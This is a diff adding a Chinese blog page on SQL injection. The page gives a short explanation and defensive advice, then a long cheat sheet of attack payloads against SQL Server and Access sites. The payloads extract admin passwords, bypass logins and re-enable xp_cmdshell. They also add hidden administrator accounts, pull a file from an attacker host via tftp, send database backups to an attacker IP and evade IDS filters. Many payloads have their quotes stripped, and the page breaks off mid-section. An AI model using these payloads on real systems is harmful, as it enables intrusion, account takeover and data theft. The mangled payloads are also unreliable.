@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+      <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="canonical" href="/article/an-quan/Sql注入.html" />
+
+    <title>  Avalon &mdash; Sql注入
+</title>
+
+
+
+
+    <link rel="stylesheet" href="/theme/css/style.css">
+
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+
+    <meta name="author" content="莲的思念">
+    <meta name="description" content="原文地址 简介 所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说就是利用现有程序将恶意的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入恶意的SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者的意图去执行SQL语句。 原理 SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法力的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。根据相关技术原理，SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞导致；后者主要是由于程序员对输入未进行细致地过滤，从而执行非法的数据查询。基于此，SQL注入的产生原因通常表现在： 不当的类型处理 不安全的数据库配置 不合理的查询集处理 不当的错误处理 转义字符处理不合适 多个提交处理不当 攻击 当应用程序使用输入内容来构造动态的sql语句以访问数据库时，会发生sql注入攻击。如果代码使用存储过程，而这些存储过程作为包含未筛选的用户输入的字符串来传递，也会发生sql注入。sql注入可能导致攻击者使用应用程序登录在数据库中执行命令。如果应用程序使用特权过高的帐户连接到数据库，这种问题会变得很严重。在某些表单中，用户输入的内容直接用来构造动态sql命令，或者作为存储过程的输入参数，这些表单特别容易受到sql注入的攻击。而许多网站程序在编写时，没有对用户输入的合法性进行判断或者程序中本身的变量处理不当，使应用程序存在安全隐患。这样，用户就可以提交一段数据库查询的代码，根据程序返回的结果，获得一些敏感的信息或者控制整个服务器，于是sql注入就发生了。 防护 归纳一下 ...">
+  <meta name="tags" contents="">
+</head>
+
+<body>
+<header class="header">
+  <div class="container">
+    <div class="header-inner">
+      <h1 class="header-name">
+        <a class="nodec" href="/">Avalon</a>
+      </h1>
+      <h3 class="header-text">忆惜往日如作梦，月洒清辉映琉璃。</h3>
+      <ul class="header-menu list-inline">
+		<li><a class="nodec" href="/category/an-quan.html">安全</a></li>
+		<li><a class="nodec" href="/category/python.html">Python</a></li>
+		<li><a class="nodec" href="/category/wang-luo.html">网络</a></li>
+		<li><a class="nodec" href="/category/za-xiang.html">杂项</a></li>
+		
+      </ul>
+    </div>
+  </div>
+</header> <!-- /.header -->  <div class="container">
+  <div class="post full-post">
+    <h1 class="post-title">
+		<a href="/article/an-quan/Sql注入.html" title="Sql注入">Sql注入</a>
+    </h1>
+    <ul class="list-inline">
+      <li class="post-date">
+        <a class="text-muted" title="2016-01-12T00:00:00+08:00">2016年01月12日</a>
+      </li>
+      <li class="muted">&middot;</li>
+      <li class="post-category">
+	  <a href="/category/an-quan.html">安全</a>
+      </li>
+    </ul>
+    <div class="post-content">
+      <p><a href="http://wiki.ichunqiu.com/index.php/SQL%E6%B3%A8%E5%85%A5">原文地址</a></p>
+<h1> 简介 </h1>
+
+<p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说就是利用现有程序将恶意的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入恶意的SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者的意图去执行SQL语句。</p>
+<h2> 原理 </h2>
+
+<p>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法力的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。根据相关技术原理，SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞导致；后者主要是由于程序员对输入未进行细致地过滤，从而执行非法的数据查询。基于此，SQL注入的产生原因通常表现在：</p>
+<ul>
+<li>不当的类型处理</li>
+<li>不安全的数据库配置</li>
+<li>不合理的查询集处理</li>
+<li>不当的错误处理</li>
+<li>转义字符处理不合适</li>
+<li>多个提交处理不当</li>
+</ul>
+<h2> 攻击 </h2>
+
+<p>当应用程序使用输入内容来构造动态的sql语句以访问数据库时，会发生sql注入攻击。如果代码使用存储过程，而这些存储过程作为包含未筛选的用户输入的字符串来传递，也会发生sql注入。sql注入可能导致攻击者使用应用程序登录在数据库中执行命令。如果应用程序使用特权过高的帐户连接到数据库，这种问题会变得很严重。在某些表单中，用户输入的内容直接用来构造动态sql命令，或者作为存储过程的输入参数，这些表单特别容易受到sql注入的攻击。而许多网站程序在编写时，没有对用户输入的合法性进行判断或者程序中本身的变量处理不当，使应用程序存在安全隐患。这样，用户就可以提交一段数据库查询的代码，根据程序返回的结果，获得一些敏感的信息或者控制整个服务器，于是sql注入就发生了。</p>
+<h2> 防护 </h2>
+
+<p>归纳一下，主要有以下几点：</p>
+<ol>
+<li>永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和双"-"进行转换等。</li>
+<li>永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。</li>
+<li>永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</li>
+<li>不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。</li>
+<li>应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装</li>
+<li>sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFT SCAN等。采用MDCSOFT-IPS可以有效的防御SQL注入，XSS攻击等。</li>
+</ol>
+<h1> 注入方法 </h1>
+
+<h3> 方法1 </h3>
+
+<p>先猜表名</p>
+<div class="highlight"><pre>And (Select count(*) from 表名) &lt;&gt;0 #猜列名
+And (Select count（列名） from 表名）&lt;&gt;0 #或者也可以这样
+and exists (select * from 表名）
+and exists (select 列名 from 表名）
+</pre></div>
+
+
+<p>返回正确的，那么写的表名或列名就是正确。</p>
+<p>这里要注意的是，exists这个不能应用于猜内容上，例如and exists (select len(user) from admin)&gt;3这样是不行的很多人都是喜欢查询里面的内容，一旦iis没有关闭错误提示的，那么就可以利用报错方法轻松获得库里面的内容获得数据库连接用户名；and user&gt;0这个是小竹提出来的，我这里引用《SQL注入天书》里面的一段话来讲解："重点在and user&gt;0，我们知道，user是SQLServer的一个内置变量，它的值是当前连接的用户名，类型为nvarchar。拿一个nvarchar的值跟int的数0比较，系统会先试图将nvarchar的值转成int型，当然，转的过程中肯定会出错SQLServer的出错提示是：将nvarchar转换int异常，XXXX不能转换成int"。看到这里大家明白了吧，报错的原理就是利用SQLserver内置的系统表进行转换查询，转换过程会出错，然后就会显示出在网页上，另外还有类似的and 1=(selet top 1 user from admin），这种语句也是可以爆出来的。；and db_name()&gt;0 则是暴数据库名。</p>
+<p>一旦关闭了IIS报错，那么还可以用union（联合查询）来查内容，主要语句就是</p>
+<div class="highlight"><pre>Order by 10
+And 1=2 union select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 from admin
+And 1=2 union select 1, 2, 3, user, 5, passwd, 7, 8, 9, 10 from admin
+</pre></div>
+
+
+<p>上面的order by 10主要就是查字段数目，admin就是表名，可以自己猜，user, passwd是列名。反正就是返回正确即对，返回异常即错。</p>
+<p>另外还有十分常用的ASCII码拆半法先要知道指定列名，例如user里的内容的长度 <code>and (select len(user) from admin)=2</code> 就是查询长度为不为2位，返回错误的增加或减少数字，一般这个数字不会太大，太大的就要放弃了，猜也多余。</p>
+<p>后面的逻辑符号可以根据不同要求更改的，&gt;：大于 &lt;：小于 =就是等于咯，更新语句的话，=也可以表示传递符号，&lt;&gt;就是不等。知道了长度后就可以开始猜解了<code>And(Select top 1 asc(mid(user, n, 1)) from admin)&gt;100</code> n就是猜解的表名的第几位，最后的长度数字就是刚才猜解出来的列名长度了，<code>And (Select top 1 asc(mid(user, 1, 1)) from admin)&gt;100</code> 就是猜解user里内容的第一位的ASCII字符是不是大于100</p>
+<p>正确的话，那么表示USER第一个字符的ASCII码大于100，那么就猜&gt;120，返回错误就是介于100－120之间，然后再一步一步的缩少，最终得到正确字符XXX，然后用ASCII转换器把这个转换成普通字符就可以了。然后就是第二位 <code>And (Select top 1 asc(mid(user, 2, 1)) from admin)&gt;100</code> 。。。一直猜下去。</p>
+<p>加在url后面，列名表名还是先猜解，返回正确的代表帐号的ASCII码大于100，那么就再向前猜，直到报错，把猜出来的ASCII码拿去ASCII转换器转换就可以了，中文是负数，加上asb取绝对值And (Select top 1 asb(asc(mid(user, n, 1))) from admin)&gt;15320。得到之后就记得在数字前加-号，不然ASCII转换器转换不来的，中文在ASCII码里是-23423这样的，所以猜起来挺麻烦这个猜解速度比较慢，但是效果最好，最具有广泛性。</p>
+<h3> 方法2 </h3>
+
+<p>后台身份验证绕过漏洞。验证绕过漏洞就是'or'='or'后台绕过漏洞，利用的就是AND和OR的运算规则，从而造成后台脚本逻辑性错误。</p>
+<p>例如管理员的账号密码都是admin，那么再比如后台的数据库查询语句是</p>
+<div class="highlight"><pre>user=request(&quot;user&quot;)
+passwd=request(&quot;passwd&quot;)
+sql=&#39;select admin from adminbate where user=&#39;&amp;&amp;user&amp;&amp;&#39; and passwd=&#39;&amp;&amp;passwd&amp;
+</pre></div>
+
+
+<p>那么我使用'or 'a'='a来做用户名密码的话，那么查询就变成了</p>
+<p><code>select admin from adminbate where user=or 'a'='a' and passwd=or 'a'='a'</code></p>
+<p>这样的话，根据运算规则，这里一共有4个查询语句，那么查询结果就是 假or真and假or真，先算and 再算or，最终结果为真，这样就可以进到后台了。</p>
+<p>这种漏洞存在必须要有2个条件：第一个在后台验证代码上，账号与密码的查询是要同一条查询语句，也就是类似</p>
+<p><code>sql="select * from admin where username='"&amp;username&amp;'&amp;"passwd='"&amp;passwd&amp;'</code></p>
+<p>如果一旦账号密码是分开查询的，先查帐号，再查密码，这样的话就没有办法了。第二就是要看密码加不加密，一旦被MD5加密或者其他加密方式加密的，那就要看第一种条件有没有可以，没有达到第一种条件的话，那就没有戏了。</p>
+<h1> SQL注入技术 </h1>
+
+<h4> 强制产生错误 </h4>
+
+<p>对数据库类型、版本等信息进行识别是此类型攻击的动机所在。它的目的是收集数据库的类型、结构等信息为其他类型的攻击做准备，可谓是攻击的一个预备步骤。利用应用程序服务器返回的默认错误信息而取得漏洞信息。</p>
+<h4> 采用非主流通道技术 </h4>
+
+<p>除HTTP响应外，能通过通道获取数据，然而，通道大都依赖于数据库支持的功能而存在，所以这项技术不完全适用于所有的数据库平台。SQL注入的非主流通道主要有E-mail、DNS以及数据库连接，基本思想为：先对SQL查询打包，然后借助非主流通道将信息反馈至攻击者。</p>
+<h4> 使用特殊的字符 </h4>
+
+<p>不同的SQL数据库有许多不同是特殊字符和变量，通过某些配置不安全或过滤不细致的应用系统能够取得某些有用的信息，从而对进一步攻击提供方向。</p>
+<h4> 使用条件语句 </h4>
+
+<p>此方式具体可分为基于内容、基于时间、基于错误三种形式。一般在经过常规访问后加上条件语句，根据信息反馈来判定被攻击的目标。</p>
+<h4> 利用存储过程 </h4>
+
+<p>通过某些标准存储过程，数据库厂商对数据库的功能进行扩展的同时，系统也可与进行交互。部分存储过程可以让用户自行定义。通过其他类型的攻击收集到数据库的类型、结构等信息后，便能够建构执行存储过程的命令。这种攻击类型往往能达到远程命令执行、特权扩张、拒绝服务的目的。</p>
+<h4> 避开输入过滤技术 </h4>
+
+<p>虽然对于通常的编码都可利用某些过滤技术进行SQL注入防范，但是鉴于此种情况下也有许多方法避开过滤，一般可达到此目的的技术手段包括SQL注释和动态查询的使用，利用截断，URL编码与空字节的使用，大小写变种的使用以及嵌套剥离后的表达式等等。借助于此些手段，输入构思后的查询可以避开输入过滤，从而攻击者能获得想要的查询结果。</p>
+<h4> 推断技术 </h4>
+
+<p>能够明确数据库模式、提取数据以及识别可注入参数。此种方式的攻击通过网站对用户输入的反馈信息，对可注入参数、数据库模式推断，这种攻击构造的查询执行后获得的答案只有真、假两种。基于推断的注入方式主要分为时间测定注入与盲注入两种。前者是在注入语句里加入语句诸如"waitfor 100"，按照此查询结果出现的时间对注入能否成功和数据值范围的推导进行判定；后者主要是"and 1=1"、"and 1=2"两种经典注入方法。这些方式均是对一些间接关联且能取得回应的问题进行提问，进而通过响应信息推断出想要信息，然后进行攻击。</p>
+<h1> SQL注入防范 </h1>
+
+<h4> 使用参数化的过滤性语句 </h4>
+
+<p>要防御SQL注入，用户的输入就绝对不能直接被嵌入到SQL语句中。恰恰相反，用户的输入必须进行过滤，或者使用参数化的语句。参数化的语句使用参数而不是将用户输入嵌入到语句中。在多数情况中，SQL语句就得以修正。然后，用户输入就被限于一个参数。</p>
+<h4> 输入验证 </h4>
+
+<p>检查用户输入的合法性，确信输入的内容只包含合法的数据。数据检查应当在客户端和服务器端都执行之所以要执行服务器端验证，是为了弥补客户端验证机制脆弱的安全性。在客户端，攻击者完全有可能获得网页的源代码，修改验证合法性的脚本（或者直接删除脚本），然后将非法内容通过修改后的表单提交给服务器。因此，要保证验证操作确实已经执行，唯一的办法就是在服务器端也执行验证。你可以使用许多内建的验证对象，例如Regular Expression Validator，它们能够自动生成验证用的客户端脚本，当然你也可以插入服务器端的方法调用。如果找不到现成的验证对象，你可以通过Custom Validator自己创建一个。</p>
+<h4> 错误消息处理 </h4>
+
+<p>防范SQL注入，还要避免出现一些详细的错误消息，因为黑客们可以利用这些消息。要使用一种标准的输入确认机制来验证所有的输入数据的长度、类型、语句、企业规则等。</p>
+<h4> 加密处理 </h4>
+
+<p>将用户登录名称、密码等数据加密保存。加密用户输入的数据，然后再将它与数据库中保存的数据比较，这相当于对用户输入的数据进行了"消毒"处理，用户输入的数据不再对数据库有任何特殊的意义，从而也就防止了攻击者注入SQL命令。</p>
+<h4> 存储过程来执行所有的查询 </h4>
+
+<p>SQL参数的传递方式将防止攻击者利用单引号和连字符实施攻击。此外，它还使得数据库权限可以限制到只允许特定的存储过程执行，所有的用户输入必须遵从被调用的存储过程的安全上下文，这样就很难再发生注入式攻击了。</p>
+<h4> 使用专业的漏洞扫描工具 </h4>
+
+<p>攻击者们目前正在自动搜索攻击目标并实施攻击，其技术甚至可以轻易地被应用于其它的Web架构中的漏洞。企业应当投资于一些专业的漏洞扫描工具，如大名鼎鼎的Acunetix的Web漏洞扫描程序等。一个完善的漏洞扫描程序不同于网络扫描程序，它专门查找网站上的SQL注入式漏洞。最新的漏洞扫描程序可以查找最新发现的漏洞。</p>
+<h4> 确保数据库安全 </h4>
+
+<p>锁定你的数据库的安全，只给访问数据库的web应用功能所需的最低的权限，撤销不必要的公共许可，使用强大的加密技术来保护敏感数据并维护审查跟踪。如果web应用不需要访问某些表，那么确认它没有访问这些表的权限。如果web应用只需要只读的权限，那么就禁止它对此表的 drop 、insert、update、delete 的权限，并确保数据库打了最新补丁。</p>
+<h4> 安全审评 </h4>
+
+<p>在部署应用系统前，始终要做安全审评。建立一个正式的安全过程，并且每次做更新时，要对所有的编码做审评。开发队伍在正式上线前会做很详细的安全审评，然后在几周或几个月之后他们做一些很小的更新时，他们会跳过安全审评这关，"就是一个小小的更新，我们以后再做编码审评好了"。请始终坚持做安全审评。</p>
+<h1> 语句特征 </h1>
+
+<h4> 判断有无注入点 </h4>
+
+<p>and 1=1 and 1=2</p>
+<h4> 猜解表 </h4>
+
+<p>猜表一般的表的名称无非是admin adminuser user pass password 等..</p>
+<div class="highlight"><pre>and 0&lt;&gt;(select count(*) from *)
+and 0&lt;&gt;(select count(*) from admin) ---判断是否存在admin这张表
+</pre></div>
+
+
+<h4> 猜解帐号数目 </h4>
+
+<p>如果遇到0&lt; 返回正确页面， 1&lt;返回错误页面，说明帐号数目就是1个
+and 0&lt;(select count(<em>) from admin)
+and 1&lt;(select count(</em>) from admin)</p>
+<h4> 猜解字段名称 </h4>
+
+<p>在len( ) 括号里面加上我们想到的字段名称.
+and 1=(select count(<em>) from admin where len(</em>)&gt;0)--
+and 1=(select count(<em>) from admin where len（用户字段名称name)&gt;0)
+and 1=(select count(</em>) from admin where len（密码字段名称password)&gt;0)</p>
+<h4> 猜解各个字段的长度 </h4>
+
+<p>猜解长度就是把&gt;0变换 直到返回正确页面为止</p>
+<div class="highlight"><pre>and 1=(select count(*) from admin where len(*)&gt;0)
+and 1=(select count(*) from admin where len(name)&gt;6) 错误
+and 1=(select count(*) from admin where len(name)&gt;5) 正确 长度是6
+and 1=(select count(*) from admin where len(name)=6) 正确
+and 1=(select count(*) from admin where len(password)&gt;11) 正确
+and 1=(select count(*) from admin where len(password)&gt;12) 错误 长度是12
+and 1=(select count(*) from admin where len(password)=12) 正确
+</pre></div>
+
+
+<h4> 猜解字符 </h4>
+
+<div class="highlight"><pre>and 1=(select count(*) from admin where left(name, 1)=a) ---猜解用户帐号的第一位
+and 1=(select count(*) from admin where left(name, 2)=ab)---猜解用户帐号的第二位
+就这样一次加一个字符这样猜，猜到够你刚才猜出来的多少位了就对了，帐号就算出来了
+and 1=(select top 1 count(*) from Admin where Asc(mid(pass, 5, 1))=51) --
+这个查询语句可以猜解中文的用户和密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符.
+group by users. id having 1=1--
+group by users. id, users.username, users.password, users.privs having 1=1--
+
+insert into users values( 666, attacker, foobar, 0xffff )--
+
+UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=logintable-
+UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=logintable WHERE COLUMN_NAME NOT IN (login_id)-
+UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=logintable WHERE COLUMN_NAME NOT IN (login_id, login_name)-
+UNION SELECT TOP 1 login_name FROM logintable-
+UNION SELECT TOP 1 password FROM logintable where login_name=Rahul--
+</pre></div>
+
+
+<div class="highlight"><pre><span class="x">看服务器打的补丁=出错了打了SP4补丁</span>
+
+<span class="x">and 1=(select @@VERSION)--</span>
+<span class="x">看数据库连接账号的权限，返回正常，证明是服务器角色sysadmin权限。</span>
+
+<span class="x">and 1=(SELECT IS_SRVROLEMEMBER(sysadmin))--</span>
+<span class="x">判断连接数据库帐号。（采用SA账号连接 返回正常=证明了连接账号是SA）</span>
+
+<span class="x">and sa=(SELECT System_user)--</span>
+<span class="x">and user_name()=dbo--</span>
+<span class="x">and 0&lt;&gt;(select user_name())--</span>
+<span class="x">看xp_cmdshell是否删除</span>
+
+<span class="x">and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = X AND name = xp_cmdshell)--</span>
+<span class="x">xp_cmdshell被删除，恢复，支持绝对路径的恢复</span>
+
+<span class="x">EXEC master.dbo.sp_addextendedproc xp_cmdshell, xplog70.dll--</span>
+<span class="x">EXEC master.dbo.sp_addextendedproc xp_cmdshell, c</span>
+<span class="x">    \inetpub\wwwroot\xplog70.dll--</span>
+
+<span class="x">反向PING自己实验</span>
+
+<span class="x">use master; declare @s int; exec sp_oacreate &quot;wscript.shell&quot;, @s out; exec sp_oamethod @s, &quot;run&quot;, NULL, &quot;cmd.exe /c ping 192.168.0.1&quot;; --</span>
+
+<span class="x">加帐号</span>
+
+<span class="x">DECLARE @shell INT EXEC SP_OACREATEwscript.shell, @shell OUTPUT EXEC SP_OAMETHOD @shell, run, null, C</span>
+<span class="x">    \WINNT\system32\cmd.exe</span>
+
+<span class="x">/c net user jiaoniang$ 1866574 /add--</span>
+<span class="x">创建一个虚拟目录E盘：</span>
+
+<span class="x">declare @o int exec sp_oacreatewscript.shell, @o out exec sp_oamethod @o, run, NULL, cscript.exec</span>
+<span class="x">    \inetpub\wwwroot\mkwebdir.vbs -w &quot;默认Web站点&quot; -v &quot;e&quot;, &quot;e：\&quot;--</span>
+
+<span class="x">访问属性：（配合写入一个webshell）</span>
+
+<span class="x">declare @o int exec sp_oacreate wscript.shell, @o out exec sp_oamethod @o, run, NULL, cscript.exec:\inetpub\wwwroot\chaccess.vbs -a w3svc/1/ROOT/e +browse</span>
+<span class="x">爆库</span>
+
+<span class="x">特殊技巧：：%5c=\ 或者把/和\ 修改%5提交</span>
+
+<span class="x">and 0&lt;&gt;(select top 1 paths from newtable)--</span>
+<span class="x">得到库名</span>
+
+<span class="x">（从1到5都是系统的id，6以上才可以判断）</span>
+<span class="x">and 1=(select name from master.dbo.sysdatabases where dbid=7)--</span>
+<span class="x">and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6)</span>
+<span class="x">依次提交 dbid = 7, 8, 9.... 得到更多的数据库名</span>
+<span class="x">and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U) 暴到一个表 假设为 admin</span>
+<span class="x">and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U and name not in (Admin)) 来得到其他的表。</span>
+<span class="x">and 0&lt;&gt;(select count(*) from bbs.dbo.sysobjects where xtype=U and name=admin</span>
+<span class="x">and uid&gt;(str(id))) 暴到UID的数值假设为18779569 uid=id</span>
+<span class="x">and 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id=18779569) 得到一个admin的一个字段，假设为 user_id</span>
+<span class="x">and 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id=18779569 and name not in</span>
+<span class="x">(id, ...)) 来暴出其他的字段</span>
+<span class="x">and 0&lt;(select user_id from BBS.dbo.admin where username&gt;1) 可以得到用户名</span>
+<span class="x">依次可以得到密码。假设存在user_id username, password 等字段</span>
+<span class="x">and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6)</span>
+<span class="x">and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U) 得到表名</span>
+<span class="x">and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U and name not in(Address))</span>
+<span class="x">and 0&lt;&gt;(select count(*) from bbs.dbo.sysobjects where xtype=U and name=admin and uid&gt;(str(id))) 判断id值</span>
+<span class="x">and 0&lt;&gt;(select top 1 name from BBS.dbo.syscolumns where id=773577794) 所有字段</span>
+<span class="x">id=-1 union select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, * from admin</span>
+<span class="x">id=-1 union select 1, 2, 3, 4, 5, 6, 7, 8, *, 9, 10, 11, 12, 13 from admin (union，access也好用）</span>
+<span class="x">得到WEB路径</span>
+
+<span class="x">create table [dbo].[swap] ([swappass][char](255)); --</span>
+
+<span class="x">and (select top 1 swappass from swap)=1--</span>
+
+<span class="x">CREATE TABLE newtable(id int IDENTITY(1, 1), paths varchar(500)) Declare @test varchar(20) exec master..xp_regread</span>
+
+<span class="x">@rootkey=HKEY_LOCAL_MACHINE, @key=SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Virtual Roots\, @value_name=/,  values=@testOUTPUT insert into paths(path) values(@test)--</span>
+
+<span class="x">use ku1; --</span>
+<span class="x">create table cmd (str image); -- 建立image类型的表cmd</span>
+
+<span class="x">存在xp_cmdshell的测试过程：</span>
+
+<span class="x">exec master..xp_cmdshell dir</span>
+<span class="x">exec master.dbo.sp_addlogin jiaoniang$; -- 加SQL帐号</span>
+<span class="x">exec master.dbo.sp_password null, jiaoniang$, 1866574; --</span>
+<span class="x">exec master.dbo.sp_addsrvrolemember jiaoniang$ sysadmin; --</span>
+<span class="x">exec master.dbo.xp_cmdshell net user jiaoniang$ 1866574 /workstations</span>
+<span class="x">    * /times:all /passwordchg:yes /passwordreq:yes</span>
+
+<span class="x">/active:yes /add; --</span>
+
+<span class="x">exec master.dbo.xp_cmdshell net localgroup administrators jiaoniang$ /add; --</span>
+
+<span class="x">exec master..xp_servicecontrol start, schedule 启动服务</span>
+<span class="x">exec master..xp_servicecontrol start, server</span>
+
+<span class="x">DECLARE @shell INT EXEC SP_OACREATE wscript.shell, @shell OUTPUT EXEC SP_OAMETHOD @shell, run, null, C：\WINNT\system32</span>
+
+<span class="x">\cmd.exe /c net user jiaoniang$ 1866574 /add</span>
+
+<span class="x">DECLARE @shell INT EXEC SP_OACREATE wscript.shell, @shell OUTPUT EXEC SP_OAMETHOD @shell, run, null, C：\WINNT\system32\cmd.exe</span>
+
+<span class="x">/c net localgroup administrators jiaoniang$ /add</span>
+
+<span class="x">exec master..xp_cmdshell tftp -i youip get file.exe-- 利用TFTP上传文件</span>
+<span class="x">declare @a sysname set @a=xp_+cmdshell exec @a dir c</span>
+<span class="x">    \</span>
+<span class="x">declare @a sysname set @a=xp+_cm’+’dshell exec @a dir c</span>
+<span class="x">    \</span>
+<span class="x">declare @a; set @a=db_name(); backup database @a to disk=你的IP你的共享目录bak.dat</span>
+
+<span class="x">如果被限制则可以。</span>
+<span class="x">select * from openrowset(sqloledb, server; sa; , select OK! exec master.dbo.sp_addlogin hax)</span>
+<span class="x">查询构造：</span>
+
+
+<span class="x">SELECT * FROM news WHERE id=... AND topic=... AND .....</span>
+<span class="x">adminand 1=(select count(*) from [user] where username=victim and right(left(userpass, 01), 1)=1) and userpass &lt;&gt;</span>
+<span class="x">select 123; --</span>
+
+<span class="x">use master; --</span>
+<span class="x">    a or name like fff%; -- 显示有一个叫ffff的用户哈。</span>
+
+<span class="x">and 1&lt;&gt;(select count(email) from [user]); --</span>
+
+<span class="x">update [users] set email=(select top 1 name from sysobjects where xtype=u and status&gt;0) where name=ffff; --</span>
+<span class="x">update [users] set email=(select top 1 id from sysobjects where xtype=u and name=ad) where name=ffff; --</span>
+<span class="x">update [users] set email=(select top 1 name from sysobjects where xtype=u and id&gt;581577110) where name=ffff; --</span>
+<span class="x">update [users] set email=(select top 1 count(id) from password) where name=ffff; --</span>
+<span class="x">update [users] set email=(select top 1 pwd from password where id=2) where name=ffff; --</span>
+<span class="x">update [users] set email=(select top 1 name from password where id=2) where name=ffff; --</span>
+
+<span class="x">上面的语句是得到数据库中的第一个用户表，并把表名放在ffff用户的邮箱字段中。</span>
+<span class="x">通过查看ffff的用户资料可得第一个用表叫ad</span>
+<span class="x">然后根据表名ad得到这个表的ID 得到第二个表的名字</span>
+<span class="x">insert into users values( 666, char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73), char(0x63)+char(0x68)+char(0x72)+char (0x69)+char(0x73), 0xffff)--</span>
+<span class="x">insert into users values( 667, 123, 123, 0xffff)--</span>
+<span class="x">insert into users values ( 123, admin--, password, 0xffff)--</span>
+
+<span class="x">and user&gt;0</span>
+<span class="x">and (select count(*) from sysobjects)&gt;0</span>
+<span class="x">and (select count(*) from mysysobjects)&gt;0 //为access数据库</span>
+
+<span class="x">枚举出数据表名</span>
+
+<span class="x">update aaa set aaa=(select top 1 name from sysobjects where xtype=u and status&gt;0); --</span>
+
+<span class="x">这是将第一个表名更新到aaa的字段处。</span>
+<span class="x">读出第一个表，第二个表可以这样读出来（在条件后加上 and name&lt;&gt;；刚才得到的表名）。</span>
+
+<span class="x">update aaa set aaa=(select top 1 name from sysobjects where xtype=u and status&gt;0 and name&lt;&gt;vote); --</span>
+
+<span class="x">然后id=1552 and exists(select * from aaa where aaa&gt;5)</span>
+<span class="x">读出第二个表，一个个的读出，直到没有为止。</span>
+<span class="x">读字段是这样：</span>
+
+<span class="x">update aaa set aaa=(select top 1 col_name(object_id（表名），1)); --</span>
+
+<span class="x">然后id=152 and exists(select * from aaa where aaa&gt;5)出错，得到字段名</span>
+
+<span class="x">update aaa set aaa=(select top 1 col_name(object_id（表名），2)); --</span>
+
+<span class="x">然后id=152 and exists(select * from aaa where aaa&gt;5)出错，得到字段名</span>
+<span class="x">[获得数据表名][将字段值更新为表名，再想法读出这个字段的值就可得到表名]</span>
+<span class="x">update 表名 set 字段=(select top 1 name from sysobjects where xtype=u and status&gt;0 [ and name&lt;&gt;；你得到的表名 查出一个加一个])</span>
+<span class="x">[ where 条件] select top 1 name from sysobjects where xtype=u and status&gt;0 and name not in(table1, table2，…）</span>
+<span class="x">通过SQLSERVER注入漏洞建数据库管理员帐号和系统管理员帐号[当前帐号必须是SYSADMIN组]</span>
+<span class="x">[获得数据表字段名][将字段值更新为字段名，再想法读出这个字段的值就可得到字段名]</span>
+<span class="x">update 表名 set 字段=(select top 1 col_name(object_id（要查询的数据表名），字段列如：1) [ where 条件]</span>
+<span class="x">绕过IDS的检测[使用变量]</span>
+
+<span class="x">declare @a sysname set @a=xp_+cmdshell exec @a dir c</span>
+<span class="x">    \</span>
+<span class="x">declare @a sysname set @a=xp+_cm’+’dshell exec @a dir c</span>
+<span class="x">    \</span>
+
+<span class="x">开启远程数据库</span>
+
+<span class="x">基本语法</span>
+<span class="x">select * from OPENROWSET(SQLOLEDB, server=servername; uid=sa; pwd=123, select * from table1 )</span>
+<span class="x">参数： (1) OLEDB Provider name</span>
+<span class="x">其中连接字符串参数可以是任何端口用来连接，比如</span>
+<span class="x">select * from OPENROWSET(SQLOLEDB, uid=sa; pwd=123; Network=DBMSSOCN; Address=192.168.0.1, 1433; , select * from table</span>
+<span class="x">复制目标主机的整个数据库insert所有远程表到本地表。</span>
+<span class="x">基本语法：</span>
